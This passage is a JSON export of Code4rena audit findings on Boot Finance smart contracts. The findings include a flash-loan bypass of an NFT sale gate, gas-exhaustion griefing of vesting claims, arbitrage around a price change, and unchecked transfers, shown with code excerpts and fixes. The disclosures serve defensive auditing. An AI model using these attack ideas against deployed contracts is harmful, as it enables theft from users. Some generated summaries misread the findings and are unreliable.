      "summary": "\nThis bug report is about a function in the InvestorDistribution contract that prevents investors from claiming their tokens. The function `claim()` has a statement that stops execution, making it impossible to claim tokens. The recommended mitigation step is to remove the require statement. The issue has been downgraded to a medium risk as there is an alternative path for claiming the tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/131",
      "tags": [],
      "finders": []
    },
    {
      "id": "42330",
      "title": "[H-07] `customPrecisionMultipliers` would be rounded to zero and break the pool",
      "impact": "HIGH",
      "content": "_Submitted by jonah1005_\n\n#### Impact\n\n`CustomPrecisionMultipliers` are set in the constructor:\n\n```solidity\ncustomPrecisionMultipliers[0] = targetPriceStorage.originalPrecisionMultipliers[0].mul(_targetPrice).div(10 ** 18);\n```\n\n`originalPrecisionMultipliers` equal to 1 if the token's decimal = 18. The targe price could only be an integer.\n\nIf the target price is bigger than 10\\*\\*18, the user can deposit and trade in the pool. Though, the functionality would be far from the spec.\n\nIf the target price is set to be smaller than 10\\*\\*18, the pool would be broken and all funds would be stuck.\n\nI consider this is a high-risk issue.\n\n#### Proof of Concept\n\nPlease refer to the implementation.\n[Swap.sol#L184-L187](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/Swap.sol#L184-L187)\n\nWe can also trigger the bug by setting a pool with target price = 0.5. (0.5 \\* 10\\*\\*18)\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nI recommend providing extra 10\\*\\*18 in both multipliers.\n\n```solidity\ncustomPrecisionMultipliers[0] = targetPriceStorage.originalPrecisionMultipliers[0].mul(_targetPrice).mul(10**18).div(10 ** 18);\ncustomPrecisionMultipliers[1] = targetPriceStorage.originalPrecisionMultipliers[1].mul(10**18);\n```\n\nThe customswap only supports two tokens in a pool, there's should be enough space. Recommend the devs to go through the trade-off saddle finance has paid to support multiple tokens. The code could be more clean and efficient if the pools' not support multiple tokens.\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/183)**\n\n",
      "summary": "\nThe report highlights a bug in the CustomSwap feature of Boot Finance, submitted by a user named jonah1005. The bug affects the functionality of the pool if the target price is set to be smaller than 10\\*\\*18, causing all funds to be stuck. This is considered a high-risk issue. The bug can be triggered by setting a pool with a target price of 0.5 (0.5 * 10\\*\\*18). The report recommends a mitigation step of providing extra 10\\*\\*18 in both multipliers and suggests that the code could be made more efficient by not supporting multiple tokens in a pool. The report has been confirmed by a member of the Boot Finance team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/183",
      "tags": [],
      "finders": []
    },
    {
      "id": "42329",
      "title": "[H-03] `SwapUtils.sol` Wrong implementation",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nBased on the context, the `tokenPrecisionMultipliers` used in price calculation should be calculated in realtime based on `initialTargetPrice`, `futureTargetPrice`, `futureTargetPriceTime` and current time, just like `getA()` and `getA2()`.\n\nHowever, in the current implementation, `tokenPrecisionMultipliers` used in price calculation is the stored value, it will only be changed when the owner called `rampTargetPrice()` and `stopRampTargetPrice()`.\n\nAs a result, the `targetPrice` set by the owner will not be effective until another `targetPrice` is being set or `stopRampTargetPrice()` is called.\n\n#### Recommendation\n\nConsider adding `Swap.targetPrice` and changing the `_xp()` at L661 from:\n\n<https://github.com/code-423n4/2021-11-bootfinance/blob/f102ee73eb320532c5a7c1e833f225c479577e39/customswap/contracts/SwapUtils.sol#L661-L667>\n\n```solidity\nfunction _xp(Swap storage self, uint256[] memory balances)\n    internal\n    view\n    returns (uint256[] memory)\n{\n    return _xp(balances, self.tokenPrecisionMultipliers);\n}\n```\n\nTo:\n\n```solidity\nfunction _xp(Swap storage self, uint256[] memory balances)\n    internal\n    view\n    returns (uint256[] memory)\n{\n    uint256[2] memory tokenPrecisionMultipliers = self.tokenPrecisionMultipliers;\n    tokenPrecisionMultipliers[0] = self.targetPrice.originalPrecisionMultipliers[0].mul(_getTargetPricePrecise(self)).div(WEI_UNIT)\n    return _xp(balances, tokenPrecisionMultipliers);\n}\n```\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/252)**\n\n",
      "summary": "\nThe bug report discusses an issue with the `tokenPrecisionMultipliers` used in price calculation in the `Swap` contract. Currently, the value of `tokenPrecisionMultipliers` is only changed when the owner calls `rampTargetPrice()` or `stopRampTargetPrice()`, which means that the `targetPrice` set by the owner may not be effective until another `targetPrice` is set or `stopRampTargetPrice()` is called. The recommendation is to add a `Swap.targetPrice` and make changes to the `_xp()` function in line 661 to address this issue. The report has been confirmed by the developer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/252",
      "tags": [],
      "finders": []
    },
    {
      "id": "979",
      "title": "[M-12] No Transfer Ownership Pattern",
      "impact": "MEDIUM",
      "content": "## Handle\n\ndefsec\n\n\n## Vulnerability details\n\n## Impact\n\nThe current ownership transfer process involves the current owner calling Swap.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier.\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/customswap/contracts/Swap.sol#L30\"\n2. The contract has many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.",
      "summary": "\nThis bug report is about the ownership transfer process in the Swap.sol contract. The current process involves the current owner calling Swap.transferOwnership() which checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. However, if the nominated EOA account is not a valid account, it is possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. \n\nTo demonstrate the vulnerability, the bug report provides a proof of concept. It involves navigating to the Swap.sol contract, which is inherited from the Ownable which includes transferOwnership. No tools were used.\n\nThe recommended mitigation steps include implementing a zero address check and considering implementing a two step process. This two step process would involve the owner nominating an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This will ensure the nominated EOA account is a valid and active account.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/35",
      "tags": [
        "Two-Step Pattern",
        "Ownership"
      ],
      "finders": [
        "elprofesor",
        "Reigada",
        "pauliax",
        "mics",
        "Ruhum",
        "defsec"
      ]
    },
    {
      "id": "978",
      "title": "[M-11] Overwrite benRevocable",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nAnyone can call the function vest() of Vesting.sol, for example with a smail \"_amount\" of tokens, for any _beneficiary.\n\nThe function overwrites the value of benRevocable[_beneficiary], effectively erasing any previous value.\n\nSo you can set any _beneficiary to Revocable.\nAlthough revoke() is only callable by the owner, this is circumventing the entire mechanism of benRevocable.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/Vesting.sol#L73-L98\n\nfunction vest(address _beneficiary, uint256 _amount, uint256 _isRevocable) external payable whenNotPaused {\n        ...\n        if(_isRevocable == 0){\n            benRevocable[_beneficiary] = [false,false];  // just overwrites the value\n        }\n        else if(_isRevocable == 1){\n            benRevocable[_beneficiary] = [true,false]; // just overwrites the value\n        }      \n\n## Tools Used\n\n## Recommended Mitigation Steps\nWhitelist the calling of vest()\nOr check if values for benRevocable are already set.",
      "summary": "\nThis bug report is about a vulnerability in the Vesting.sol file of the 2021-11-bootfinance repository. The vulnerability allows anyone to call the vest() function of the file, even with a small amount of tokens, for any beneficiary. This call would overwrite the value of benRevocable[_beneficiary], effectively erasing any previous value. This means that anyone could set any beneficiary to revocable, even though revoke() is only callable by the owner. To fix this problem, the developers of the 2021-11-bootfinance repository should whitelist the calling of the vest() function or check if values for benRevocable are already set.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/132",
      "tags": [],
      "finders": [
        "gpersoon",
        "pauliax",
        "cmichel",
        "leastwood",
        "WatchPug",
        "hyh"
      ]
    },
    {
      "id": "977",
      "title": "[M-10] Can’t claim last part of airdrop",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nSuppose you are eligible for the last part of your airdrop (or your entire airdrop if you haven't claimed anything yet).\nThen you call the function claim() of AirdropDistribution.sol, which has the following statement:\n\"assert(airdrop[msg.sender].amount - claimable != 0);\"\nThis statement will prevent you from claiming your airdrop because it will stop execution.\n\nNote: with the function claimExact() it is possible to claim the last part.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L522-L536\n\nfunction claim() external nonReentrant {\n       ..\n        assert(airdrop[msg.sender].amount - claimable != 0);\n        airdrop[msg.sender].amount -= claimable;\n\n## Tools Used\n\n## Recommended Mitigation Steps\nRemove the assert statement.\nAlso add the following to validate() , to prevent claiming the airdrop again:\n      require(validated[msg.sender]== 0, \"Already validated.\");",
      "summary": "\nThis bug report is about an issue with the AirdropDistribution.sol function claim(). The bug is caused by the statement \"assert(airdrop[msg.sender].amount - claimable != 0);\" which prevents users from claiming their airdrop. This statement is located in the function claim() of AirdropDistribution.sol.\n\nThe bug can be reproduced by calling the function claim(). The proof of concept can be found in the link provided in the report.\n\nThe recommended mitigation steps are to remove the assert statement and add a statement to the validate() function to prevent claiming the airdrop again.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/130",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "976",
      "title": "[M-09] NFT flashloans can bypass sale constraints",
      "impact": "MEDIUM",
      "content": "## Handle\n\npauliax\n\n\n## Vulnerability details\n\n## Impact\nPublic sale has a constraint that for the first 4 weeks only NFT holders can access the sale:\n  if (currentEra < firstPublicEra) {\n    require(nft.balanceOf(msg.sender) > 0, \"You need NFT to participate in the sale.\");\n  }\n\nHowever, this check can be easily bypassed with the help of flash loans. You can borrow the NFT, participate in the sale and then return this NFT in one transaction. It takes only 1 NFT that could be flashloaned again and again to give access to the sale for everyone (burnEtherForMember).\n\n## Recommended Mitigation Steps\nI am not sure what could be the most elegant solution to this problem. You may consider transferring and locking this NFT for at least 1 block but then the user will need to do an extra tx to retrieve it back. You may consider taking a snapshot of user balances so the same NFT can be used by one address only but then this NFT will lose its extra benefit of selling it during the pre-sale when it acts as a pre-sale token. You may consider checking that the caller is EOA but again there are ways to bypass that too.",
      "summary": "\nThis bug report is about a vulnerability in the public sale of a token that allows anyone to bypass the constraint that only NFT holders can access the sale. This is done by using flash loans, which allow users to borrow the NFT, participate in the sale, and then return the NFT in one transaction. This can be done with only one NFT, which can be flashloaned again and again to give access to the sale for everyone. The bug report suggests that the most elegant solution for this problem is unclear, but some potential solutions include transferring and locking the NFT for at least one block, taking a snapshot of user balances so the same NFT can only be used by one address, or checking that the caller is an EOA.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/276",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "975",
      "title": "[M-08] LPToken.set_minter() doesn’t check that _minter doesn’t equal zero",
      "impact": "MEDIUM",
      "content": "## Handle\n\npants\n\n\n## Vulnerability details\n\nThe function `LPToken.set_minter()` doesn't check that `_minter` doesn't equal zero before it sets it as the new minter.\n\n## Impact\nThis function can be invoked by mistake with the zero address as `_minter`, causing the system to lose its minter forever, without the option to set a new minter.\n\n## Tool Used\nManual code review.\n\n## Recommended Mitigation Steps\nCheck that `_minter` doesn't equal zero before setting it as the new minter.",
      "summary": "\nA bug was identified in the function `LPToken.set_minter()` of the 'pants' system. This bug means that if the wrong address is passed as an argument, the system will lose its minter and won't be able to set a new one. This was identified during a manual code review. To fix this, the system should check that `_minter` doesn't equal zero before it sets it as the new minter.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/69",
      "tags": [],
      "finders": [
        "pants"
      ]
    },
    {
      "id": "974",
      "title": "[M-07] MainToken.set_mint_multisig() doesn’t check that _minting_multisig doesn’t equal zero",
      "impact": "MEDIUM",
      "content": "## Handle\n\npants\n\n\n## Vulnerability details\n\nThe function `MainToken.set_mint_multisig()` doesn't check that `_minting_multisig` doesn't equal zero before it sets it as the new `minting_multisig`.\n\n## Impact\nThis function can be invoked by mistake with the zero address as `_minting_multisig`, causing the system to lose its `minting_multisig` forever, without the option to set a new `minting_multisig`.\n\n## Tool Used\nManual code review.\n\n## Recommended Mitigation Steps\nCheck that `_minting_multisig` doesn't equal zero before setting it as the new `minting_multisig`.",
      "summary": "\nThis bug report concerns a vulnerability in the function `MainToken.set_mint_multisig()` in the \"pants\" system. The issue is that the function does not check that `_minting_multisig` is not equal to zero before it sets it as the new `minting_multisig`. This can cause the system to lose its `minting_multisig` permanently if the zero address is mistakenly used as `_minting_multisig`. The vulnerability was discovered through manual code review. The recommended mitigation step is to check that `_minting_multisig` does not equal zero before setting it as the new `minting_multisig`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/66",
      "tags": [],
      "finders": [
        "pants"
      ]
    },
    {
      "id": "973",
      "title": "[M-05] Stop ramp target price would create huge arbitrage space.",
      "impact": "MEDIUM",
      "content": "## Handle\n\njonah1005\n\n\n## Vulnerability details\n\n## Stop ramp target price would create huge arbitrage space.\n## Impact\n`stopRampTargetPrice` would set the `tokenPrecisionMultipliers` to `originalPrecisionMultipliers[0].mul(currentTargetPrice).div(WEI_UNIT);`\nOnce the `tokenPrecisionMultipliers` is changed, the price in the AMM pool would change. Arbitrager can sandwich `stopRampTargetPrice` to gain profit.\n\nAssume the decision is made in the DAO, an attacker can set up the bot once the proposal to `stopRampTargetPrice` has passed. I consider this is a medium-risk issue.\n\n## Proof of Concept\nThe `precisionMultiplier` is set here:\n[Swap.sol#L661-L666](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/Swap.sol#L661-L666)\n\nWe can set up a mockSwap with extra `setPrecisionMultiplier` to check the issue.\n```solidity\n    function setPrecisionMultiplier(uint256 multipliers) external {\n        swapStorage.tokenPrecisionMultipliers[0] = multipliers; \n    }\n```\n\n```python\nprint(swap.functions.getVirtualPrice().call())\nswap.functions.setPrecisionMultiplier(2).transact()\nprint(swap.functions.getVirtualPrice().call())\n\n## output log:\n## 1000000000000000000\n## 1499889859738721606\n```\n## Tools Used\nNone\n## Recommended Mitigation Steps\nDealing with the target price with multiplier precision seems clever as we can reuse most of the existing code. However, the precision multiplier should be an immutable parameter. Changing it after the pool is setup would create multiple issues. This function could be implemented in a safer way IMHO.\n\nA quick fix I would come up with is to ramp the `tokenPrecisionMultipliers` as the `aPrecise` is ramped. As the `tokenPrecision` is slowly increased/decreased, the arbitrage space would be slower and the profit would (probably) distribute evenly to lpers.\n\nPlease refer to `_getAPreceise`'s implementation\n[SwapUtils.sol#L227-L250](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L227-L250)",
      "summary": "\nThis bug report is about a vulnerability in the Stop Ramp Target Price which could potentially create a huge arbitrage space. This would allow an attacker to set up a bot once a proposal to stop the Ramp Target Price has passed. The bug report includes a proof of concept, which shows how the precision multiplier is set and how an attacker can use it to gain profits. The recommended mitigation steps include ramping the token precision multipliers as the aPrecise is ramped. This would slow down the arbitrage space and distribute the profits evenly to lpers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/208",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "972",
      "title": "[M-04] Get virtual price is not monotonically increasing ",
      "impact": "MEDIUM",
      "content": "## Handle\n\njonah1005\n\n\n## Vulnerability details\n\n## Impact\nThere's a feature of `virtualPrice` that is monotonically increasing regardless of the market. This function is heavily used in multiple protocols. e.g.(curve metapool, mim, ...) This is not held in the current implementation of customSwap since `customPrecisionMultipliers` can be changed by changing the target price.\n\nThere're two issues here:\nThe meaning of `virtualPrice` would be vague.\nThis may damage the lp providers as the protocol that adopts it may be hacked.\n\nI consider this is a medium-risk issue.\n\n## Proof of Concept\nWe can set up a mockSwap with extra `setPrecisionMultiplier` to check the issue.\n```solidity\n    function setPrecisionMultiplier(uint256 multipliers) external {\n        swapStorage.tokenPrecisionMultipliers[0] = multipliers; \n    }\n```\n\n```python\n    print(swap.functions.getVirtualPrice().call())\n    swap.functions.setPrecisionMultiplier(2).transact()\n    print(swap.functions.getVirtualPrice().call())\n\n## output log:\n## 1000000000000000000\n## 1499889859738721606\n```\n## Tools Used\nNone\n## Recommended Mitigation Steps\nDealing with the target price with multiplier precision seems clever as we can reuse most of the existing code. However, the precision multiplier should be an immutable parameter. Changing it after the pool is set up would create multiple issues. This function could be implemented in a safer way IMHO.\n\nThe quick fix would be to remove the `getVirtualPrice` function. I can't come up with a safe way if other protocol wants to use this function.",
      "summary": "\nThe bug report is about a feature of 'virtualPrice' that is monotonically increasing regardless of the market. This function is heavily used in multiple protocols such as Curve Metapool and MIM. The issue is that the meaning of 'virtualPrice' would be vague and could damage the lp providers as the protocol that adopts it may be hacked. The bug is considered to be of medium-risk. \n\nA proof of concept was provided to test the issue, which involved setting up a mockSwap with extra 'setPrecisionMultiplier' and checking the output of the 'getVirtualPrice' function. \n\nThe recommended mitigation step is to remove the 'getVirtualPrice' function as a quick fix. A safer way should be implemented if other protocols want to use this function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/185",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "971",
      "title": "[M-03] Investor can’t claim the last tokens (via claim() )",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nSuppose you are an investor and want to claim the last part of your claimable tokens (or your entire set of claimable tokens if you haven't claimed anything yet).\nThen you call the function claim() of InvestorDistribution.sol, which has the following statement:\n\"require(investors[msg.sender].amount - claimable != 0);\"\nThis statement will prevent you from claiming your tokens because it will stop execution.\n\nNote: with the function claimExact() it is possible to claim the last part.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/InvestorDistribution.sol#L113-L128\n\nfunction claim() external nonReentrant {\n...\n        require(investors[msg.sender].amount - claimable != 0);\n        investors[msg.sender].amount -= claimable;\n\n## Tools Used\n\n## Recommended Mitigation Steps\nRemove the require statement.",
      "summary": "\nThis bug report is about a statement in the InvestorDistribution.sol file which prevents investors from claiming the last part of their claimable tokens. The statement in question is \"require(investors[msg.sender].amount - claimable != 0);\". This statement will stop execution and thus prevent the investor from claiming their tokens. The bug can be replicated by calling the claim() function of InvestorDistribution.sol. The recommended mitigation step is to remove the require statement.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/131",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "970",
      "title": "[M-02] Unchecked low-level calls",
      "impact": "MEDIUM",
      "content": "_Submitted by 0v3rf10w, also found by Reigada_\n\n#### Impact\n\nUnchecked low-level calls\n\n#### Proof of Concept\n\nUnchecked cases at 2 places :-\n`BasicSale.receive()` (2021-11-bootfinance/tge/contracts/PublicSale.sol#148-156) ignores return value by `burnAddress.call{value: msg.value}()` (2021-11-bootfinance/tge/contracts/PublicSale.sol#154)\n\nBasicSale.burnEtherForMember(address) (2021-11-bootfinance/tge/contracts/PublicSale.sol#158-166) ignores return value by `burnAddress.call{value: msg.value}()` (2021-11-bootfinance/tge/contracts/PublicSale.sol#164)\n\n#### Tools Used\n\nManual\n\n#### Recommended Mitigation Steps\n\nThe return value of the low-level call is not checked, so if the call fails, the Ether will be locked in the contract. If the low level is used to prevent blocking operations, consider logging failed calls.\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/145)**\n\n",
      "summary": "\nThis bug report is about unchecked low-level calls in the 2021-11-bootfinance/tge/contracts/PublicSale.sol file. This bug can cause the Ether to be locked in the contract if the low-level call fails. The vulnerability was identified using manual tools.\n\nThe unchecked calls are present in two places in the PublicSale.sol file. The first is in the BasicSale.receive() function (lines 148-156) and the second is in the BasicSale.burnEtherForMember(address) function (lines 158-166). Both of these functions ignore the return value of the burnAddress.call{value: msg.value}() call (lines 154 and 164 respectively).\n\nThe recommended mitigation step for this vulnerability is to consider logging failed calls if the low level is used to prevent blocking operations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/145",
      "tags": [],
      "finders": [
        "Reigada",
        "0v3rf10w"
      ]
    },
    {
      "id": "969",
      "title": "[M-01] Unchecked transfers",
      "impact": "MEDIUM",
      "content": "_Submitted by Reigada, also found by Ruhum, loop, cmichel, defsec, pauliax, WatchPug, and 0v3rf10w_\n\n#### Impact\n\nMultiple calls to `transferFrom` and transfer are frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of “false” is returned. It’s important to check this. If you don’t, in this concrete case, some airdrop eligible participants could be left without their tokens. It is also a best practice to check this.\n\n#### Proof of Concept\n```\nAirdropDistributionMock.sol:132:        mainToken.transfer(msg.sender, claimable_to_send);\nAirdropDistributionMock.sol:157:        mainToken.transfer(msg.sender, claimable_to_send);\nAirdropDistribution.sol:542:        mainToken.transfer(msg.sender, claimable_to_send);\nAirdropDistribution.sol:567:        mainToken.transfer(msg.sender, claimable_to_send);\n\nInvestorDistribution.sol:132:        mainToken.transfer(msg.sender, claimable_to_send);\nInvestorDistribution.sol:156:        mainToken.transfer(msg.sender, claimable_to_send);\nInvestorDistribution.sol:207:        mainToken.transfer(msg.sender, bal);\n\nVesting.sol:95:        vestingToken.transferFrom(msg.sender, address(this), \\_amount);\n\nPublicSale.sol:224:            mainToken.transfer(\\_member, v_value);\n```\n#### Tools Used\n\nManual testing\n\n#### Recommended Mitigation Steps\n\nCheck the result of `transferFrom` and transfer. Although if this is done, the contracts will not be compatible with non standard ERC20 tokens like USDT. For that reason, I would rather recommend making use of SafeERC20 library: `safeTransfer` and `safeTransferFrom`.\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/31)**\n\n",
      "summary": "\nThis bug report focuses on the importance of checking the result of multiple calls to transferFrom and transfer. These functions are frequently done without checking the results, which can lead to some airdrop eligible participants being left without their tokens. To prevent this, it is recommended to check the result of transferFrom and transfer. However, this may not be compatible with non standard ERC20 tokens like USDT. To solve this, it is recommended to make use of SafeERC20 library and use the functions safeTransfer and safeTransferFrom. Manual testing was used to identify this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/31",
      "tags": [],
      "finders": [
        "Reigada",
        "pauliax",
        "cmichel",
        "Ruhum",
        "WatchPug",
        "loop",
        "0v3rf10w",
        "defsec"
      ]
    },
    {
      "id": "968",
      "title": "[H-09] addInvestor() Does Not Check Availability of investors_supply",
      "impact": "HIGH",
      "content": "_Submitted by Meta0xNull_\n\n#### Impact\n\nWhen add investor, `addInvestor()` does not check how many tokens is available from `investors_supply`. The total tokens allocated for Investors could more than `investors_supply`.\n\nPossible Attack Scenario:\n\n1.  Attacker who have Admin Private key call `addInvestor()` and `Input \\_amount >= investors_supply`.\n2.  Attacker can Claim All Available Tokens Now.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L85-L94>\n\n#### Tools Used\n\nManual Review\n\n#### Recommended\n\n1.  Add `require(\\_amount <= (investors_supply - Allocated_Amount))`\n2.  When Add an Investor add the amount to `Allocated_Amount` with SafeMath\n\n**[chickenpie347 (Boot Finance) acknowledged](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/201#issuecomment-970317628):**\n > While this is true, the addInvestor would be a one-time routine at deployment which would precisely send the allocated number of tokens to the contract as per to the allocatations.\n\n\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the addInvestor() function of the InvestorDistribution.sol contract. This vulnerability allows an attacker who has access to the Admin Private Key to call the addInvestor() function and input an amount that is greater than the investors_supply. This would allow the attacker to claim all available tokens, leaving none for other investors. The vulnerability is demonstrated in the provided Proof of Concept link.\n\nThe impact of this vulnerability is that investors can be cheated out of their tokens.\n\nThe recommended solution is to add a check to the addInvestor() function that requires the amount inputted to be less than or equal to the investors_supply minus the allocated amount. Additionally, when adding an investor, the amount should be added to the allocated amount using SafeMath. This will ensure that the total amount of tokens allocated to investors is not greater than the investors_supply.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/201",
      "tags": [],
      "finders": [
        "Meta0xNull"
      ]
    },
    {
      "id": "967",
      "title": "[H-08] Unable to claim vesting due to unbounded timelock loop",
      "impact": "HIGH",
      "content": "_Submitted by nathaniel, also found by WatchPug, leastwood, and pauliax_\n\n#### Impact\n\nThe timelocks for any *beneficiary* are unbounded, and can be vested by someone who is not the *beneficiary*. When the array becomes significantly big enough, the vestments will no longer be claimable for the *beneficiary*.\n\nThe `vest()` function in Vesting.sol does not check the *beneficiary*, hence anyone can vest for anyone else, pushing a new timelock to the `timelocks[_beneficiary]`.\nThe `_claimableAmount()` function (used by `claim()` function), then loops through the `timelocks[_beneficiary]` to determine the amount to be claimed.\nA malicious actor can easy repeatedly call the `vest()` function with minute amounts to make the array large enough, such that when it comes to claiming, it will exceed the gas limit and revert, rendering the vestment for the beneficiary unclaimable.\nThe malicious actor could do this to each *beneficiary*, locking up all the vestments.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L81>\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L195>\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L148>\n\n#### Tools Used\n\nManual code review\n\n#### Recommended Mitigation Steps\n\n*   Create a minimum on the vestment amounts, such that it won't be feasible for a malicious actor to create a large amount of vestments.\n*   Restrict the vestment contribution of a *beneficiary* where `require(beneficiary == msg.sender)`\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/120)**\n\n",
